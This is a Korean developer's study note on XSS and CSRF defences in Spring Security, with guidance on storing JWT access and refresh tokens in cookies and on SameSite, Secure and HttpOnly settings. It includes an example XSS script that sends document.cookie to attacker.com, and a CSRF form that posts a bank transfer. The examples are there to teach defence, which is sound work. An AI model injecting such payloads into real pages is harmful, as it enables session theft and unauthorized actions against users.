#SpringSecurity 
#보안 

---
## 1. XSS 공격

XSS는 **공격자가 웹 페이지에 악성 JavaScript 코드를 삽입해서, 사용자의 브라우저에서 실행되게 만드는 공격**입니다.

예를 들어 게시판 댓글에 이런 코드가 저장되고,

```html
<script>  
	fetch("https://attacker.com?cookie=" + document.cookie)
</script>
```

다른 사용자가 그 댓글을 보는 순간 브라우저에서 실행될 수 있습니다.

### XSS로 가능한 피해

로그인 쿠키 탈취, 사용자 대신 요청 보내기, 화면 조작, 피싱 페이지 삽입 등이 가능합니다.

### XSS 방어 방법

가장 중요한 건 **입력값을 그대로 HTML로 렌더링하지 않는 것**입니다.

```html
// 위험
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 안전
<div>{userInput}</div>
```

방어 방법은 다음과 같습니다.

- 사용자 입력값 검증
- HTML 출력 시 이스케이프 처리
- React/Next.js의 기본 escaping 활용
- `dangerouslySetInnerHTML` 사용 최소화
- 쿠키에 `HttpOnly` 적용
- CSP(Content Security Policy) 적용

특히 `HttpOnly` 쿠키를 사용하면 JavaScript에서 쿠키를 읽을 수 없어서, XSS가 발생해도 토큰 탈취 위험을 줄일 수 있습니다.

---

## 2. CSRF 공격

CSRF는 **사용자가 로그인된 상태를 악용해서, 공격자가 의도한 요청을 사용자의 권한으로 보내게 만드는 공격**입니다.

예를 들어 사용자가 은행 사이트에 로그인한 상태에서 공격 사이트에 접속했는데, 공격 사이트가 몰래 이런 요청을 보낼 수 있습니다.

```html
<form action="https://bank.com/transfer" method="POST">  
<input name="to" value="attacker" />  
<input name="amount" value="1000000" />
</form>
```

브라우저는 해당 사이트의 쿠키를 자동으로 포함해서 요청을 보낼 수 있기 때문에 문제가 됩니다.

### CSRF 방어 방법

핵심은 **정상 화면에서 발생한 요청인지 검증하는 것**입니다.

대표적인 방어 방법은 다음과 같습니다.

- `SameSite=Lax` 또는 `SameSite=Strict` 쿠키 설정
- CSRF Token 사용
- 중요한 요청은 `GET`이 아니라 `POST/PUT/DELETE` 사용
- `Origin`, `Referer` 헤더 검증
- CORS를 무분별하게 열지 않기
- 인증 쿠키에는 `Secure`, `HttpOnly` 설정

예시:

```http
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Lax; Path=/auth/refresh
```

---

## 3. Access Token과 Refresh Token을 쿠키에 저장해도 될까?

결론부터 말하면, **Refresh Token은 HttpOnly 쿠키에 저장하는 방식이 꽤 적절합니다.**  
다만 **Access Token까지 쿠키에 저장하는 건 상황에 따라 신중해야 합니다.**

## 권장 방식

### Refresh Token

Refresh Token은 수명이 길기 때문에 JavaScript에서 접근하지 못하게 해야 합니다.

따라서 다음 설정의 쿠키에 저장하는 것이 좋습니다.

```
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Lax; Path=/auth/refresh
```

추천 설정:

```
HttpOnly
Secure
SameSite=Lax 또는 Strict
Path=/auth/refresh
짧지 않은 만료 시간
Refresh Token Rotation 적용
```

### Access Token

Access Token은 보통 수명이 짧습니다. 선택지는 두 가지입니다.

#### 방법 1. Access Token을 메모리에 저장

프론트엔드 메모리 상태에만 저장합니다.

장점은 **XSS로 인한 영구 탈취 위험이 줄어든다**는 점입니다.  
단점은 **새로고침하면 사라져서 Refresh Token으로 재발급**해야 합니다.

#### 방법 2. Access Token도 HttpOnly 쿠키에 저장

이 경우 **JavaScript에서 탈취하기 어렵다**는 장점이 있습니다.  
하지만 브라우저가 요청마다 자동으로 쿠키를 보내기 때문에 **CSRF 방어가 필수**입니다.

---
## 최종 추천

가장 무난한 구조는 이겁니다.

```
Access Token:
- 응답 body로 내려줌
- 프론트 메모리에 저장
- API 요청 시 Authorization: Bearer {accessToken}

Refresh Token:
- HttpOnly + Secure + SameSite 쿠키
- Redis에도 저장해서 서버에서 검증
- 재발급 API에서만 사용
```


---
## SameSite는 쿠키 생성할 때 설정

Spring Security 설정이 아니라 **쿠키를 발급하는 백엔드 코드에서 설정**합니다.

예를 들어 로그인 성공 시 Refresh Token 쿠키를 생성하는 코드라면:

```java
ResponseCookie refreshCookie = ResponseCookie.from("refreshToken", refreshToken)
        .httpOnly(true)
        .secure(true)
        .sameSite("Strict")
        .path("/")
        .maxAge(Duration.ofDays(14))
        .build();

response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());
```

Access Token 쿠키도 동일합니다.

```java
ResponseCookie accessCookie = ResponseCookie.from("accessToken", accessToken)
        .httpOnly(true)
        .secure(true)
        .sameSite("Strict")
        .path("/")
        .maxAge(Duration.ofMinutes(30))
        .build();

response.addHeader(HttpHeaders.SET_COOKIE, accessCookie.toString());
```

## application.yml에서 설정하는 방법

Spring Boot 버전에 따라 세션 쿠키는 이렇게 가능합니다.

```yml
server:
  servlet:
    session:
      cookie:
        same-site: strict
```

하지만 이건 **JSESSIONID 같은 세션 쿠키**에 대한 설정입니다.

JWT용으로 직접 생성한 쿠키는 보통 위의 `ResponseCookie`에서 설정합니다.

---
## Strict를 무조건 쓰면 안 되는 경우
면접에서 자주 나오는 포인트입니다.

### SameSite=Strict
```
다른 사이트에서 넘어온 요청에는 쿠키 전송 안 함
```

예를 들어
```
google.com   ↓내 서비스
```

이 경우에도 쿠키가 안 붙을 수 있습니다.
보안은 가장 강하지만 UX 문제가 생길 수 있습니다.

### SameSite=Lax
```
일반 링크 이동(GET)은 허용POST 같은 위험 요청은 차단
```

실무에서는 가장 많이 사용됩니다.
```java
.sameSite("Lax")
```

### SameSite=None
```
크로스 도메인 허용
```

반드시
```java
.secure(true)
```

와 함께 사용해야 합니다.

주로
```
frontend.example.comapi.example.com
```

처럼 프론트와 API 도메인이 다를 때 사용합니다.


### 프로젝트에서 주의사항

만약
```
Frontendhttps://www.example.comBackendhttps://api.example.com
```

이라면
```java
.sameSite("Strict")
```

로 설정 시 로그인 자체가 꼬일 수 있습니다.

보통
```java
.sameSite("None").secure(true)
```

를 사용합니다.

반대로
```
https://example.com
```

하나의 도메인에서 프론트와 백엔드가 함께 서비스된다면
```java
.sameSite("Lax")
```

가 가장 무난합니다.

---
## 1. SameSite 기본값
과거에는 SameSite 속성을 지정하지 않으면
```
Set-Cookie: token=abc123
```

이렇게 발급되었고 사실상 **None과 비슷하게 동작**했습니다.
하지만 현재 대부분의 브라우저(특히 Chrome)는 RFC 변경 이후
```
SameSite 속성이 없으면
→ SameSite=Lax 로 간주
```

합니다.

즉 현재는 보통
```
설정 안 함
↓
브라우저가 Lax로 처리
```

라고 생각하시면 됩니다.
하지만 브라우저 정책에 의존하는 것이므로 **명시적으로 설정하는 것이 좋습니다.**
```java
.sameSite("Lax")
```

또는
```java
.sameSite("Strict")
```

## 2. Secure 기본값
`Secure`는 기본적으로 **false** 입니다.

예를 들어
```
Set-Cookie: refreshToken=abc123
```

라고만 내려주면
```
HTTP 가능
HTTPS 가능
```

입니다.

반면
```
Set-Cookie: refreshToken=abc123; Secure
```

이면
```
HTTPS에서만 전송
HTTP에서는 전송 안 함
```

입니다.
따라서 운영 환경에서는 거의 필수입니다.
```java
.secure(true)
```

## 3. HttpOnly 기본값
이것도 기본값은 **false** 입니다.

설정 안 하면
```javascript
document.cookie
```

로 읽을 수 있습니다.
즉 XSS가 발생했을 때 토큰 탈취 위험이 커집니다.

그래서
```java
.httpOnly(true)
```

를 반드시 설정합니다.

## 실무에서 JWT 쿠키 설정 예시

```java
ResponseCookie refreshCookie = ResponseCookie.from("refreshToken", refreshToken)
        .httpOnly(true)
        .secure(true)
        .sameSite("Lax")
        .path("/auth/reissue")
        .maxAge(Duration.ofDays(14))
        .build();
```

이렇게 되면
```
HttpOnly = true
Secure = true
SameSite = Lax
```

가 명시적으로 적용됩니다.